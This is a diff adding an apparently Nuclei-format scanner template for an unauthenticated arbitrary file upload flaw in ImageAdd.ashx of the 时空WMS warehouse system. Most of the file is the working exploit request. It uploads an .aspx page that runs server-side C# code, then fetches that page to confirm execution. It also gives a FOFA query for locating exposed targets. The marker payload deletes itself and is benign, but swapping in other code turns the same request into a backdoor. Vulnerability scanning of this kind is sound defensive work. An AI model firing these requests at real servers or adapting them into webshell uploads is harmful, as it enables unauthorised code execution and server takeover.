@@ -1,0 +1,52 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: uploadfile
+          part: body
+          regex:
+            - ([0-9]+/\w+\.aspx)
+          type: regex
+      raw:
+        - |
+          POST /ImageUpload/ImageAdd.ashx HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+          Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+          Upgrade-Insecure-Requests: 1
+          Accept-Encoding: gzip
+
+          ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+          Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
+          Content-Type: text/plain
+
+          <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+          ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /upload/{{uploadfile}} HTTP/1.1
+          Host: {{Hostname}}
+id: shikongWMS-ImageAdd_ashx-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="SKControlKLForJson.ashx"
+        时空WMS-仓储精细化管理系统 ImageAdd.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 时空WMS-仓储精细化管理系统 ImageAdd.ashx 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/tLEnx-HnYuEzb_m7jV09eg?token=523748735&lang=zh_CN
+    severity: high
+    tags:
+        - Kong
+        - SSH
+variables:
+    username: '{{to_lower(rand_base(6))}}'
